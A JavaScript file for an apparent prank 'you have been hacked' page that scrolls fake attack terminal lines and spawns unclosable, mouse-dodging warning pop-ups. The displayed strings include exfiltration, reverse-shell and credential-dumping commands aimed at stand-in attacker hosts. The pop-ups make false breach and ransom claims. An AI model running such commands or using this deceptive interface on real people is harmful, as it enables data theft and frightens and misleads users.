const terminalOutput = document.getElementById("terminalOutput");
const progressBar = document.getElementById("progressBar");
const chaosPercent = document.getElementById("chaosPercent");
const alertsList = document.getElementById("alertsList");
const runawayControl = document.getElementById("runawayControl");
const checkboxStage = document.getElementById("checkboxStage");
const escapeBox = document.getElementById("escapeBox");
const revealButton = document.getElementById("revealButton");
const revealCopy = document.getElementById("revealCopy");

const terminalLines = [
  "$ nmap -sV 192.168.1.0/24 — scanning local network...",
  "PORT 22/tcp OPEN — SSH detected on 192.168.1.1",
  "PORT 3389/tcp OPEN — RDP detected on target machine",
  "$ ssh root@192.168.1.1 — brute forcing credentials...",
  "LOGIN SUCCESS: root:admin123 — access granted",
  "$ cat /etc/shadow — dumping password hashes...",
  "HASH: $6$rounds=5000$salt$Kq8x... — cracking with hashcat",
  "$ mimikatz.exe — extracting Windows credentials from memory",
  "FOUND: Administrator:P@ssw0rd!2024",
  "FOUND: User:bank_login_2024!",
  "$ keylogger --inject --pid 1842 — hooking keyboard input",
  "CAPTURED KEYSTROKES: ****@gmail.com / ********",
  "$ scp -r ~/Documents attacker@194.32.78.11:/loot/",
  "UPLOADING: Documents/taxes_2024.pdf (2.4 MB)...",
  "UPLOADING: Documents/passwords.xlsx (840 KB)...",
  "UPLOADING: Pictures/ (14.2 GB) — 23% complete...",
  "$ netstat -an | grep ESTABLISHED",
  "194.32.78.11:4444 ← REVERSE SHELL ACTIVE",
  "91.203.4.126:8080 ← C2 BEACON CONNECTED",
  "$ reg query HKCU\\Software\\Chrome\\Passwords",
  "EXTRACTED: 47 saved passwords from Chrome",
  "EXTRACTED: 12 saved credit cards from autofill",
  "$ webcam --capture --silent --stream 194.32.78.11",
  "WEBCAM: streaming live to remote server...",
  "$ microphone --record --background",
  "MICROPHONE: recording in progress...",
  "FIREWALL: disabled Windows Defender successfully",
  "ANTIVIRUS: exclusion added for C:\\Windows\\Temp\\payload.exe",
  "$ bitcoin-wallet --scan --extract",
  "FOUND: wallet.dat — balance 0.84 BTC — transferring...",
  "TRANSFER COMPLETE: 0.84 BTC → 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "$ ransomware --encrypt --key RSA-4096 --target C:\\Users\\",
  "ENCRYPTING: C:\\Users\\Documents\\ — 847 files...",
  "ENCRYPTING: C:\\Users\\Desktop\\ — 234 files...",
  "ENCRYPTING: C:\\Users\\Pictures\\ — 1,203 files...",
  "$ persistence --install --registry --startup",
  "BACKDOOR: installed to HKLM\\Software\\Microsoft\\Run",
  "$ spread --smb --network 192.168.1.0/24",
  "WORM: spreading to 6 additional devices on network...",
  "INFECTED: DESKTOP-PC4A (192.168.1.105)",
  "INFECTED: LAPTOP-WORK (192.168.1.112)",
  "$ exfil --dns --encode base64 --server c2.darknet.ru",
  "DNS EXFIL: sending data via DNS queries to avoid detection",
  "ROOTKIT: kernel-level rootkit installed — hiding all processes",
  "PRIVILEGE ESCALATION: SYSTEM-level access achieved",
];

const alertPool = [
  "Deleted: C:\\Users\\Documents\\family_photos_2024\\",
  "Deleted: C:\\Users\\Desktop\\thesis_final.docx",
  "Deleted: C:\\Users\\Documents\\tax_returns\\",
  "Deleted: C:\\Users\\Pictures\\ — 1,203 files removed",
  "Deleted: C:\\Users\\Downloads\\project_backup.zip",
  "Deleted: C:\\Users\\Documents\\passwords.xlsx",
  "Deleted: C:\\Users\\Videos\\ — 48 GB removed",
  "Deleted: C:\\Users\\Music\\ — 2,841 files removed",
  "Deleted: C:\\Users\\Documents\\work\\contracts\\",
  "Deleted: C:\\Users\\AppData\\Chrome\\saved_passwords.db",
  "Deleted: C:\\Users\\Documents\\medical_records.pdf",
  "Deleted: D:\\Backup\\ — entire drive wiped",
];

let currentLine = 0;
let currentChaos = 0;
let revealed = false;

const popupContainer = document.getElementById("popupContainer");
const redFlash = document.getElementById("redFlash");
let popupCount = 0;

// Red flash effect
function triggerFlash() {
  if (revealed) return;
  redFlash.classList.add("active");
  setTimeout(() => redFlash.classList.remove("active"), 120);
}

let flashTimer = setInterval(() => {
  if (Math.random() < 0.6) {
    triggerFlash();
  }
}, 3000);

const popupMessages = [
  { icon: "⚠️", title: "WARNING", msg: "Your personal files are being encrypted. Do not turn off your computer." },
  { icon: "🔓", title: "SECURITY ALERT", msg: "Unauthorized access detected. Your passwords have been compromised." },
  { icon: "📷", title: "WEBCAM ACTIVE", msg: "Your camera is currently being accessed by a remote user." },
  { icon: "💳", title: "ALERT", msg: "Credit card information has been extracted from your browser." },
  { icon: "🔑", title: "CREDENTIAL THEFT", msg: "47 saved passwords have been sent to an external server." },
  { icon: "📡", title: "NETWORK BREACH", msg: "All devices on your network have been compromised." },
  { icon: "🎙️", title: "MICROPHONE ACTIVE", msg: "Audio is being recorded and transmitted to a remote server." },
  { icon: "💀", title: "RANSOMWARE", msg: "Your files will be deleted in 5:00 unless you comply." },
  { icon: "🪲", title: "ROOTKIT DETECTED", msg: "A kernel-level rootkit has been installed on this system." },
  { icon: "📧", title: "EMAIL COMPROMISED", msg: "Your email account is being used to send spam to your contacts." },
  { icon: "🏦", title: "BANKING ALERT", msg: "Suspicious login detected on your online banking account." },
  { icon: "⛔", title: "FIREWALL DISABLED", msg: "Windows Firewall has been turned off by a remote process." },
];

function spawnPopup() {
  if (revealed) return;

  const data = popupMessages[Math.floor(Math.random() * popupMessages.length)];
  const popup = document.createElement("div");
  popup.className = "popup";
  popupCount += 1;

  const maxX = window.innerWidth - 340;
  const maxY = window.innerHeight - 220;
  let posX = Math.max(20, Math.random() * maxX);
  let posY = Math.max(20, Math.random() * maxY);
  popup.style.left = posX + "px";
  popup.style.top = posY + "px";

  popup.innerHTML =
    '<div class="popup-titlebar">' +
      '<span>⚠ ' + data.title + '</span>' +
      '<button class="popup-close">✕</button>' +
    '</div>' +
    '<div class="popup-body">' +
      '<div class="popup-icon">' + data.icon + '</div>' +
      '<p class="popup-message">' + data.msg + '</p>' +
      '<div class="popup-buttons">' +
        '<button class="popup-btn">Help</button>' +
        '<button class="popup-btn popup-btn--danger">Close</button>' +
      '</div>' +
    '</div>';

  popupContainer.append(popup);

  const closeBtn = popup.querySelector(".popup-close");
  const dangerBtn = popup.querySelector(".popup-btn--danger");
  const helpBtn = popup.querySelector(".popup-btn");

  const canClose = Math.random() < 0.65;

  if (canClose) {
    // This popup can actually be closed — give the user some hope
    closeBtn.addEventListener("click", () => {
      popup.remove();
      popupCount -= 1;
      setTimeout(() => spawnPopup(), 300);
      setTimeout(() => spawnPopup(), 700);
      if (Math.random() < 0.5) setTimeout(() => spawnPopup(), 1100);
    });
    dangerBtn.addEventListener("click", () => {
      popup.remove();
      popupCount -= 1;
      setTimeout(() => spawnPopup(), 300);
      setTimeout(() => spawnPopup(), 700);
      if (Math.random() < 0.5) setTimeout(() => spawnPopup(), 1100);
    });
  } else {
    // This popup dodges the mouse
    function dodgePopup() {
      if (revealed) return;
      const newX = Math.max(20, Math.random() * (window.innerWidth - 340));
      const newY = Math.max(20, Math.random() * (window.innerHeight - 220));
      popup.style.left = newX + "px";
      popup.style.top = newY + "px";
    }

    closeBtn.addEventListener("mouseenter", dodgePopup);
    dangerBtn.addEventListener("mouseenter", dodgePopup);
  }

  // "Help" button always spawns MORE popups
  helpBtn.addEventListener("click", () => {
    spawnPopup();
    spawnPopup();
  });
}

// Spawn popups over time
let popupTimer = setInterval(() => {
  if (popupCount < 15) {
    spawnPopup();
  }
}, 4000);

// Start with 2 popups
setTimeout(() => spawnPopup(), 800);
setTimeout(() => spawnPopup(), 2000);

function makeTimestamp() {
  const now = new Date();
  return now.toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function appendTerminalLine(text) {
  const line = document.createElement("div");
  line.className = "terminal-line";

  const time = document.createElement("span");
  time.className = "terminal-time";
  time.textContent = `[${makeTimestamp()}]`;

  const message = document.createElement("span");
  message.textContent = text;
  if (text.startsWith("FOUND") || text.startsWith("CAPTURED") || text.startsWith("EXTRACTED")) {
    message.style.color = "#ff5b73";
  } else if (text.startsWith("UPLOADING") || text.startsWith("ENCRYPTING") || text.startsWith("TRANSFER")) {
    message.style.color = "#ffa07a";
  } else if (text.startsWith("$")) {
    message.style.color = "#7df9c1";
  } else if (text.startsWith("INFECTED") || text.startsWith("WORM") || text.startsWith("ROOTKIT") || text.startsWith("BACKDOOR") || text.startsWith("RANSOMWARE")) {
    message.style.color = "#ff5b73";
  } else if (text.startsWith("WEBCAM") || text.startsWith("MICROPHONE") || text.startsWith("FIREWALL") || text.startsWith("ANTIVIRUS")) {
    message.style.color = "#ffd166";
  }

  line.append(time, message);
  terminalOutput.append(line);
  terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function rotateAlert() {
  const first = alertsList.firstElementChild;
  if (first) {
    first.remove();
  }

  const next = document.createElement("li");
  next.textContent = alertPool[Math.floor(Math.random() * alertPool.length)];
  alertsList.append(next);
}

function tickChaos() {
  currentChaos += 0.3 + Math.random() * 0.8;
  if (currentChaos > 100) {
    currentChaos = 100;
  }

  const display = Math.round(currentChaos);
  progressBar.style.width = `${display}%`;
  chaosPercent.textContent = `${display}%`;
}

function moveRunawayControl(event) {
  const stageRect = checkboxStage.getBoundingClientRect();
  const controlRect = runawayControl.getBoundingClientRect();

  const pointerX = event.clientX - stageRect.left;
  const pointerY = event.clientY - stageRect.top;

  const currentLeft = runawayControl.offsetLeft;
  const currentTop = runawayControl.offsetTop;
  const controlCenterX = currentLeft + controlRect.width / 2;
  const controlCenterY = currentTop + controlRect.height / 2;

  const nearX = Math.abs(pointerX - controlCenterX) < 90;
  const nearY = Math.abs(pointerY - controlCenterY) < 50;

  if (!nearX || !nearY || revealed) {
    return;
  }

  const maxLeft = stageRect.width - controlRect.width - 8;
  const maxTop = stageRect.height - controlRect.height - 8;

  const nextLeft = Math.max(8, Math.min(maxLeft, Math.random() * maxLeft));
  const nextTop = Math.max(8, Math.min(maxTop, Math.random() * maxTop));

  runawayControl.style.left = `${nextLeft}px`;
  runawayControl.style.top = `${nextTop}px`;
}

function revealJoke() {
  revealed = true;
  document.body.classList.add("reveal-mode");
  escapeBox.checked = true;
  runawayControl.style.left = "18px";
  runawayControl.style.top = "42px";
  revealCopy.textContent =
    "Connection terminated. Remote session may still be active.";
  appendTerminalLine("$ kill -9 reverse_shell — connection dropped by remote host");
  clearInterval(popupTimer);
  clearInterval(flashTimer);
  popupContainer.innerHTML = "";
  redFlash.classList.remove("active");
}

const terminalTimer = setInterval(() => {
  const idx = Math.floor(Math.random() * terminalLines.length);
  appendTerminalLine(terminalLines[idx]);
  currentLine += 1;

  if (currentLine % 15 === 0) {
    appendTerminalLine("$ echo 'YOU HAVE BEEN HACKED' > C:\\Users\\%USERNAME%\\Desktop\\README.txt");
  }
}, 400);

const chaosTimer = setInterval(() => {
  tickChaos();
  rotateAlert();
}, 800);

checkboxStage.addEventListener("mousemove", moveRunawayControl);
checkboxStage.addEventListener("touchstart", revealJoke, { passive: true });
escapeBox.addEventListener("click", (event) => {
  if (!revealed) {
    event.preventDefault();
  }
});
runawayControl.addEventListener("click", (event) => {
  if (!revealed) {
    event.preventDefault();
  }
});
revealButton.addEventListener("click", revealJoke);

window.addEventListener("beforeunload", () => {
  clearInterval(terminalTimer);
  clearInterval(chaosTimer);
  clearInterval(popupTimer);
  clearInterval(flashTimer);
});

const secretExit = document.getElementById("secretExit");
const safeScreen = document.getElementById("safeScreen");

function showSafeScreen() {
  revealed = true;
  clearInterval(terminalTimer);
  clearInterval(chaosTimer);
  clearInterval(popupTimer);
  clearInterval(flashTimer);
  popupContainer.innerHTML = "";
  redFlash.classList.remove("active");
  safeScreen.classList.add("active");
}

secretExit.addEventListener("click", showSafeScreen);
document.addEventListener("keydown", (e) => {
  if (e.key === "n" || e.key === "N") {
    showSafeScreen();
  }
});

appendTerminalLine("$ ./exploit --target localhost --payload reverse_shell");
appendTerminalLine("CONNECTION ESTABLISHED — remote access granted");
